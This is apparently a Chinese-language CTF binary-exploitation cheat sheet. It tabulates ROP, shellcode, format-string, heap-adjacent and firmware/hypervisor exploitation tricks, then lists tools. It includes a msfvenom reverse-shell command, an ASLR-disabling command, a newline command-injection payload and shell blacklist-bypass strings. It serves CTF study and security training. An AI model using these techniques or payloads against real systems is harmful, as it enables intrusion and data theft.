| **pwntools asm() 前向标签失败/PIC shellcode 构造** | 手工三件: `jmp short body`(2B) + body 首条 `pop rbx`（call 返回地址=紧邻数据地址）+ 尾部 `call rel32`（E8+补码偏移）回 body 头——数据地址经 call/pop 获取，`and rbx,-4096` 可页对齐推基址。JIT 错位场景: 4B shellcode 块间 2B `jmp` 串联; 2 字节指令库 `push rdx;pop rsi`/`xor eax,eax`/`not dl` |
| **Windows 无格式串需栈泄漏** | `ntdll!RtlCaptureContext(&ctx)` 把含 **Rsp/Rip** 的完整寄存器组写入用户 CONTEXT 结构——确定性无随机化; 控制一次间接调用指向它+事后读缓冲即泄漏。同类: RtlUnwindEx 等"寄存器导出到用户内存"的异常处理 API 都是泄漏 gadget |
| **无泄漏但 32 位 PIE** | 多数发行版 i386 PIE 固定加载 `0x56555000`——qemu-gdb `info proc mappings` 多次运行验证一致后当常量: `target=0x56555000+符号偏移` 零泄漏。`ulimit -s unlimited` 下栈基址也确定化（0x7fff_f000）。动手泄漏前先验证映射稳定性 |
| **只能输入浮点数 double** | IEEE754 指数固定 bias+52（字节序 \x30\x43 开头）→ 加法退化为整数加无舍入——每个 double 是 6 字节无损容器; "写 N 个 double"=写 N×6 字节原始数据。程序对输入求和后执行的，选末项=系数×目标-Σ前项补齐。float 同理（bias+23，3 字节/个） |
| **Go 二进制目标** | 参数**压栈**不走 SysV 寄存器——pop rdi 链无效，gadget 搜 `mov [rsp+` 类; runtime 固有函数可链: morestack_noctxt/gopanic/memmove; Go 内嵌 "sh"/"cat /flag" 字符串免 libc 搜; **CGO 时**（ldd 见 libc）标准寄存器 ROP 恢复。IDA 9.0+ Golang FLIRT 恢复符号（1.10-1.23）。**slice 值拷贝别名**: struct 拷贝共享 backing array，cap>len 时被调方 append 原地写穿透调用方——"值传递≠不可变"; map 恒引用共享 |
| **ASAN 编译的目标** | shadow: 0x00 全通过/0x01-07 部分/F1 F3 红区/F5 返回后。**fake stack 50% 概率**——真假栈 redzone 外布局不同: 泄漏返回地址比对已知偏移判定，假栈断开重连。红区间 16B 槽位制算合法 OOB 路径; shadow 本身可改写（改 0x00 解锁越界） |
| **hash 摘要拼接当代码执行** | 爆破 preimage: 摘要首 2 字节 `eb 0c`(jmp+12) 跳到末 2 字节当指令——每 digest 一条 2 字节指令（31c0/89e1/b220/cd80）; 3-hash 链 EB02+push win+C3; 32 位前缀 8 核 60s、16 位瞬时; 预计算前缀→输入查找表应对运行时地址 |
| **"趣味编码"补丁/校验系统** | Game Genie/许可证格式类 = 字母表+位散布的位置换密码——逆向 checker 得位映射后即任意 (offset,byte) 写原语: 补丁 call memset→system + push 参数落点指向可控 "sh;" 串 |
| **字节码验证器白名单** | 静态检查只验初始指令流→**运行时自修改**: `push fs`(0f a0 合法) vs `syscall`(0f 05 禁用) 一字节差——前置 `push rbx` 让 0x05 落在 a0 字节上翻转语义。找一字节差指令对+验证器是否只验拷贝前字节（TOCTOU 指令流版） |
| **io_uring 程序有 UAF** | **SQE 注入**（≠ kworker 路线）: SQE 在用户态共享内存、内核原样信任——UAF/类型混淆写 SQE 缓冲（opcode=IORING_OP_OPENAT/fd=AT_FDCWD/addr=路径）后 worker 提交即内核开文件。审计: io_uring_setup/enter+自定义分配器 FLUSH+多线程共享内存 |
| **ORW 本地通远程挂** | Docker/socat 继承 fd 使 open 返回 fd≥4，硬编码 fd=3 读错——`xchg rdi,rax;cld;ret`（libc 常有）动态转 open 返回值; `pop rdx;xor eax,eax;ret` 双用途一次设 read 长度+清系统调用号 |
| **零泄漏但有 fgets+BSS+ROP** | **multi-fgets 拼 fake stdout**: 指针 6 字节有效+2 高位 null——fgets(addr,7) 追加的 null 恰落指针第 8 字节零破坏; 逐 7 字节拼 _flags/write_base=&GOT/write_end → fflush(fake) 输出 GOT 泄漏 libc。把"泄漏"延后到 fake FILE 自身 |
| **有符号 2D 索引 y*width+x** | int32 乘法回绕负值过有符号上界检查→**负向** OOB 写数据缓冲前元数据（改前邻 struct 的 size/height 字段扩界→泄漏→全量 OOB→environ→ROP）。Web API 包二进制时: XSS（\|safe）fetch admin API 桥接 + sendline 换行注入 `color="#0\nEXIT\n./read_flag"` 堆叠命令 |
| **栈变量共享栈槽/进位破坏** | word@rsp+0x48 与 byte@rsp+0x49 重叠（word 高字节==byte 变量）——对 word +255 进位溢入改 byte 变量（index 3→4）OOB 直达 RIP。反汇编查同偏移不同操作数大小的访问。同族: 校验晚于计算使用（AI 均值 (human+last)/2——提交 2× 偏移）/signed 坐标 vs unsigned 维度比较（负值转大无符号过 <）/手写 to_int32 符号扩展（0x80000000+i 逐字节泄漏） |
| **1 字节溢出改 size 字段** | 8-bit 读循环计数器在缓冲大小处回绕多写 1 字节——**渐进式泄漏**: 每轮 size+一点（0x40→0x48 泄漏 canary/rbp→0x77 泄漏 libc ret）→ 终轮恢复 canary+fake rbp（one_gadget 栈约束槽 [rbp-0x78]/[rbp-0x60] 用 \x00 精确对齐）+one_gadget。"每轮多看一点"比一次性利用稳 |
| **只有读原语** | ① memcpy(stack_buf,addr,len) 长度可控即写: GOT 泄漏 libc→`__environ`（libc 全局恒指栈环境数组）→返回地址定位→输入缓冲预埋 ROP→memcpy 溢出盖 ret→EOF 触发 ② 纯 read(0,stack,N): 从"恰好含所需字节"的 libc 偏移读上栈——本地扫 .text/.rodata 找 gadget 地址值出处当数据源。__environ→栈是 libc 已知后无栈泄漏的标准桥 |
| **JIT 引擎分支偏移窄类型** | jz rel32 但偏移计算 cast uint16——代码>64KB 跳进 add 立即数中间→**JIT spray**: 永假 if 内 ~9370 条用户控立即数 add，2 字节指令片段+`EB 03`(jmp $+3) 穿针跳过样板字节→mmap RWX→mov [rax],imm8 逐字节写全 shellcode |
| **DNS/解压类解析器定长输出缓冲** | 压缩指针（0xC0\|offset）链式**重访**同一数据——解压放大溢出 1024B 栈缓冲; ROP 按 DNS label 63B 限制拆多 question 条目（14+14+13 gadget）; flag 路径第二 UDP 包喂 ROP 的 read。任何"指针引用展开"解压都需放大上限 |
| **ELF 签名校验** | 只哈希 section headers+SHF_ALLOC 内容 → **program header 不在覆盖内**（加载器用 phdr 映射、section 运行时可选）: 页对齐追加 shellcode+改 PT_LOAD 的 offset/filesz/vaddr 指向它——签名仍过、加载执行 shellcode。安全设计须盖全文件 |
| **服务读秘密后可执行命令** | open/memfd_create 无 O_CLOEXEC/MFD_CLOEXEC → system 子进程继承 secret fd → `cat /proc/self/fd/N`; strstr 黑名单用单引号拆词 `p'r'oc`（bash 透明拼接、C 子串匹配破坏）绕; 同族 `\p\r\o\c` 反斜杠/`${PATH:0:1}` 展开 |
| **校验和/哈希 oracle** | CRC-8/XOR/加法和对单字节**双射**——对可控地址算校验时预计算 256 反查表逐字节读任意内存（GOT→libc→environ→canary→ROP） |
| **Unicode/表示转换后拷贝** | UTF-8 大小写转换字节膨胀（U+0587 2B→4B; g_utf8_strup/u_strToUpper）——68 个膨胀字符 136B 输入 272B 输出溢出按输入定长的缓冲。与进制转换膨胀同查"transform 后按 input 尺寸分配"模式 |
| **单 bit 翻转原语** | 累积=缓慢任意改写。优先目标: ①栈展开指令（`add rsp,0x48`→`0x08` 错位复用缓冲）②既有分支改语义（`jmp rax`(FFE0)→`jmp rsp`(FFE4); canary `jnz`(75)→`xor eax,imm32`(35)）③mprotect 参数（mov r15,rbp→rsp）④长度参数扩读。或 shellcode 与 .text 逐位比对翻差异 |
| **mmap/munmap 尺寸来源不同** | 分配按维度、释放按压缩长 → **over-unmap 摧毁邻区**: 释放缺口被 pthread 线程栈复用→悬垂缓冲指针变写线程栈→ROP（免竞态免堆元数据）。配套形态: 全局索引先写后验（last_memo 残留越界值+edit 无检查=栈写）/strdup 菜单 UAF（exit 确认 no 返回带悬垂，无校验字段 strdup 复用有校验字段槽注入 system） |
| **strcspn 截断惯用法** | `buf[strcspn(buf,"\r\n")]=0` 在换行处写 null——输入层拦 null 放行 %0A 时: `../flag.txt%0A` → null 截掉 `.cfg` 后缀+路径遍历。层间编码语义缝隙（CGI 层 vs C 层）即注入点 |
| **分发表/权限表索引寻址** | `mov rax,[base+idx*8+C]; call rax` 且检查只判表项 null 不验 idx 界——负/大索引把全二进制对齐 qword 当函数指针。选指向 `add rsp,0x58;ret` 类 pivot 的索引，消息 payload 恰在 rsp+0x58=完整 ROP。零溢出纯逻辑缺陷 |
| **NN/模型输出当索引** | 推理结果直接做数组索引/偏移且无界——改权重/bias 文件使输出越界; bias 数组（IEEE754 double）恰在落点时目标地址按位模式写进 bias=函数指针。ML 参数编辑即控制流劫持 |
| **shellcode 唯一字节/字符类限制** | 校验状态（seen[256] 计数器）在栈上时——第一段 shellcode push 喷栈覆写计数器+跳回 main 跳过 memset，第二轮污染状态算术溢出显示 <N，任意 shellcode 通过。重入跳过初始化使污染跨轮存活 |
| **迭代/演化后执行的 payload** | 找变换的**不动点**当载体——Game of Life 用 still-life（Block/Snake 构型）包夹 shellcode 行保 15 代稳定; 指令避免 5+ 连续 1 bit、`add al,0` 当 NOP、行间 JMP。简化: 稳态轻代码先 read 真 shellcode 上网格 |
| **XOR 密码污染堆元数据** | 每 seed 产生确定 XOR 向量——建 64 维 GF(2) 线性基（高斯消元）求 seed 子集 XOR 恰等于 delta=C^T（safe-linking 编码目标）——万级 seed 解 ~30-35 个，全局联合求解优于逐字节爆破。数学同 GF(2) 线性基消元 |
| **QEMU 设备/TEE/UEFI 特殊环境** | QEMU: PMIO 设 seek+MMIO OOB 写状态结构内函数指针（blocks→rand_r=system、r_seed="/bin/sh"）宿主逃逸——审计 mmio_write/pmio_write 的"基址+可控偏移"计算。OP-TEE: 通信层注入（HTTPd 替换空格但 RPC 认 \t）+TOCTOU+BGET 堆 UAF 跨信任边界; aarch64 almighty gadget。UEFI edk2: 改 chunk 的 EFI_MEMORY_TYPE 跨 freelist 类型混淆→UAF+FD/BK 任意写→启动项加 rdinit=/bin/sh |
| **libc 版本完全未知+有 GOT 泄漏+任意读** | **JIT-ROP 扫 syscall 字节**: read/write 等是 syscall 薄封装函数体内必含 `0f 05`——泄漏 read@GOT 后读函数体 0x100B，index(b'\x0f\x05') 得 syscall gadget，覆写未用 GOT（如 srand）; read(0,bss,59) 返回值恰好设 rax=59=__NR_execve → 调被覆写 PLT 即 execve。比 DynELF 交互更少 |
| **checksec 显示 No PIE 且 statically linked** | 静态链接把全部 libc 符号+字符串表拖进二进制固定地址——`nm binary \| grep ' T system'` + `strings -a binary \| grep /bin/sh` 确认后，溢出槽再小也够放 `system; exit; &/bin/sh` 三地址单链（12B），无需泄漏/gadget 搜寻 |

### 格式串进阶速查

| 场景 | 方法 |
|------|------|
| 指针参数改写后经它写（无位置参数） | **非位置参数重定向**: ⚠ 位置参数 `%N$hn` 被 glibc **预解析缓存**——中途改栈槽不生效，必须用非位置链: `%c`×N 推进到指针槽 → 非位置 `%n` 改指针指向 exit@GOT → `%<delta>c%hn` 经改后指针写（delta=(W-C%65536)mod65536）。无法内嵌地址时用; 代价百万级输出 |
| GOT 地址含坏字节写不进 | **.rela.plt/.dynsym 补丁**: No RELRO 下改 .rela.plt 目标项 r_info 符号索引字节→指向另一符号，再 %hn×2 改该符号 st_value=win——链接器跟补丁链跳转，全程不碰 GOT。与 ret2dlresolve 伪造全套法互补，本法 2-3 次写 |
| 格式串缓冲在 .bss（非栈） | **saved EBP 覆写迁移**: %n 写 saved EBP = bss_buf-4 → 函数返回 leave;ret 使 ESP 落 bss、ret 从 bss_buf 取 EIP——链首地址放缓冲开头。与堆缓冲指针链两段写并称"格式串不在栈上"两路 |
| 需要泄漏但只有崩溃消息 | **argv[0] 覆写 + SSP leak**: 溢出故意破坏 canary 后继续覆盖 argv[0]=秘密地址 → `__stack_chk_fail` 打印 `*** stack smashing detected ***: <argv[0]>` 即泄漏内容。反向用法: `__stack_chk_fail@GOT`→main 后破坏 canary 变受控重入 |
| 漏洞后紧跟 exit(0) 一次机会 | **单次 printf 读写同发**: 同 payload 先 `%25$p` 泄漏再 `%{delta}c%19$hn` 把 exit@GOT 低 16 位改 main（delta 扣除已输出计数）→ exit 被劫回 main 二次利用 |
| Objective-C NSLog(user_input) | **%@ specifier**: %@ 把栈参数当对象指针调 objc_msg_lookup(rdi,"description")——伪造 [isa=0][rax=system] 对象触发检查失败路径的 `call rax`。格式串升级为 controlled call |
| 溢出可达 libc 全局但无格式串漏洞 | **printf_function_table 覆写**: 表非 NULL 时 specifier 经 arginfo_table 分发——覆写 __libc_argv 指向 flag + 伪造表项指 _fortify_fail + 置两个表指针 → 任意 printf 触发泄漏。偏移随 glibc 版本变（version-sensitive）|
| 溢出差一点到返回地址 | **scanf 栈上格式串覆写**: 格式串是栈局部（`lea rdx,[rbp-...]` 栈寻址）而非 .rodata（rip 相对）时——第一次溢出把 "%30s" 改 "%99s"，第二次用扩大读长达 ret。guard 本身可覆写比限制值更关键 |
| 输入经变换（ROT13/XOR/Base64）后进 printf | **预编码穿透**: payload 用同一变换预编码（自逆变换直接抵消; 通用按逆序抵消构造）。ROT13 只动字母——p64 地址字节原样过，仅格式串文本需编码。**变长编码（base85）参数偏移不稳**: 解码产物占栈 P 随 payload 变——收敛循环迭代 `arg_base=6+P/8` 至自洽+补齐编码组边界; 编码致 libc 地址难算时避开 libc: RWX 固定地址写 shellcode+%hn 改 .fini_array |
| 自定义 printf specifier（register_printf_specifier） | **arginfo 回调覆写**: 注册表在堆——溢出改 arginfo_fn=system 后 `%.26739s` 的 precision(=0x6873="sh\0") 作 printf_info 首字段即 system 参数。与全局 printf_function_table 覆写同族 |
| 过滤删 % 字符 | `%%%p`——过滤器检查 % 后相邻字符时，%% 转义吃掉前两个，第三个 % 存活生效 |
| 游戏/状态机程序（不 RCE 只需改状态） | 栈上常有指向游戏变量（筹码/血量/分数）的指针——%Xc%N$n 直接写值触发 win 条件; 相邻变量（4B 间隔）用 N/N+1 两槽分别写 0 和大值 |
| **栈内容有数论约束**（须素数/平方等） | **运行时合成**: 目标值拆合法部分之和/XOR（Goldbach: 偶数=两素数和，奇数先试 2+g-2）写入相邻槽，前置 `pop rax;pop rdx;add rax,rdx;push rax;ret` 类 reducer gadget 在 ret 消费前合成。平方约束用拉格朗日四平方同理。先找程序内现成算术 gadget 再定分解形式 |
| **gadget 带中间杂指令** | 别弃用——逐行审查: 只要杂指令不破坏目的寄存器（`add al`/`and al` 不碰 esp 无害），多余栈消耗（`add esp,0x24`）用垃圾槽 padding 吸收、被 pop 的寄存器填垃圾值。与立即数藏 gadget、异种指令链并称 gadget 枯竭三路 |
| **Ruby 服务用户输入内插 unpack/pack 格式串** | 格式串注入 Ruby 变体（CVE-2018-8778，<2.5.1）: 巨大 `@N` 偏移带符号比较回绕为负→读字符串缓冲区之前的内存逐字节输出; payload `@2^64-0x1C0000 C1200000` 即任意内存 dump。相关: Ruby String#unpack 格式串注入（CVE-2018-8778）详见 pwn-methodology 格式串进阶表 |

## §5 工具链

> IDA（idat）既能静态分析也能动态调试，但它的调试器**只支持宿主机 CPU 架构**——arm64 Mac 上调不了 amd64 程序。动态调试统一用 `qemu-gdb`（自动适配 arm64/amd64，用法与普通 gdb 相同: `qemu-gdb ./pwn -ex "break main" -ex c`）; 需要堆插件时用 `gdb-pwndbg`（arm64）。

| 工具 | 用途 | 关键用法 |
|------|------|---------|
| pwntools | exploit 框架 | `context.update(arch='amd64', os='linux')` / `remote()` / `process()` / `cyclic_find()` |
| gdb-pwndbg | 堆调试（arm64; heap/tcache 命令） | `heap` / `tcache` / `vis_heap_chunks` / `find_fake_fast &__malloc_hook`（找 hook 附近可伪造 chunk） |
| one_gadget | 找 libc one_gadget | `one_gadget <libc.so>`（喂目标 libc 文件） |
| ROPgadget | 找 ROP gadget | `ROPgadget --binary <binary> --re "pop rdi"`（ropper 同能力） |
| patchelf | 改 rpath/interpreter | `patchelf --set-interpreter <ld> --set-rpath <dir> <binary>` |
| glibc-all-in-one | 下各版本 libc/ld | `git clone --depth 1 https://github.com/matrix1001/glibc-all-in-one && cd glibc-all-in-one && ./update_list.sh` 后 `./download <id>`（数据源库，clone 到工作目录用） |
| how2heap | 堆技术 PoC 库 | `git clone --recursive https://github.com/shellphish/how2heap`（按 glibc 版本目录查 PoC） |
| seccomp-tools | 分析 seccomp 规则 | `seccomp-tools dump ./<binary>` |
| libcsearcher | 由偏移反查 libc | `libcsearcher`（本地库）; 在线 libc.rip / libc.blukat.me |
| angr | 符号执行/约束求解 | 详见 `$SHARED_DIR/knowledge-base/angr-symbolic-execution.md` |

> pwndbg vs gef：二选一勿同时加载（命令冲突）。pwndbg 堆查看更强（默认首选），gef 多架构支持更好。
> GEF 专有: `format-string-helper`/`heap-analysis-helper` 运行时自动检测漏洞; `pattern create N` + 溢出后 `i f` 读 saved rip + `pattern search <val>` 直得偏移; `canary` 搜 canary 值; `xinfo <addr>` 地址详情; `memory watch` 内存监视; `dump binary memory <file> <start> <end>`。

**偏移的静态算法**（Ghidra）: 反编译局部变量名编码栈偏移——`local_bc` 即缓冲区偏移 0xbc; `local_10` 是 canary 时，缓冲区→canary 距离 = 两偏移差; 到 RIP = 缓冲区偏移 + 8(saved RBP) + 8。无需动态 cyclic 即可算，动态再验证一次更稳。

**core dump 离线分析**: `ulimit -c unlimited` + `sysctl kernel.core_pattern=/tmp/core-%e.%p.%h.%t` → 崩溃后 `qemu-gdb --core=<core文件> ./binary` 永久保存现场分析偏移（远程不可交互/间歇崩溃场景）。**corefile API 自动偏移**: pwntools 对崩溃的 process 自动生成 core——`p.wait()` 后 `cyclic_find(p.corefile.read(p.corefile.sp, 4))`（x64 从 sp 读 saved RIP）/ `cyclic_find(p.corefile.pc)`（x86）直得偏移，免手动 GDB。

**远程调试**: ① 目标机 `gdbserver --multi 0.0.0.0:23947 ./bin` + 本机 `target remote <ip>:23947`（跨架构 gdb-multiarch; qemu 用自带 gdbstub `-s -S`）② IDA 体系: 传 `linux_server64` 到目标 `-Ppass` 启动，IDA Debugger→linux remote 填 IP/密码。

**shellcode 生成**: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f python -b "\x00"`（-b 坏字符 -e 编码器 EXITFUNC=thread 防宿主退出）; 查 opcode 用 pwntools 的 `asm("nop")` 直接得字节; 手写 shellcode 用 `nasm -f elf64 sc.asm && ld sc.o` 编译，再 `objdump -d sc.o`（objdump 是 macOS 系统命令——在 /usr/bin/objdump，不在 ~/bw-security-analysis/bin，直接敲无需安装）提取机器码。

**测试靶构造**: `gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack -no-pie -g` 逐项关保护; 系统 ASLR: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`。

**pwntools 调试模式**：macOS 上无法用 `process('./binary')` 直接跑 amd64 ELF（arm64 系统），调试流程改为：
1. `qemu-gdb ./binary -ex "break main" -ex c` 单独调试二进制（确定偏移/验证利用逻辑）
2. pwntools 用 `remote('目标', 端口)` 打远程服务执行真实利用
（gdb.attach 需要本机 gdb + 本机进程，仅 Linux 宿主可用）

## §6 关联文件

- `$SHARED_DIR/knowledge-base/pwn-heap-methodology.md` — 堆利用详解：House of Apple/Cat/Water/Tangerine 伪造模板、safe-linking 绕过、原语速查
- `$SHARED_DIR/knowledge-base/pwn-kernel-methodology.md` — 内核利用详解：结构体泄漏表、msg_msg/Dirty PageTable、竞态窗口扩大、cross-cache
- `$SHARED_DIR/knowledge-base/analysis-planning.md` — 通用分析规划流程
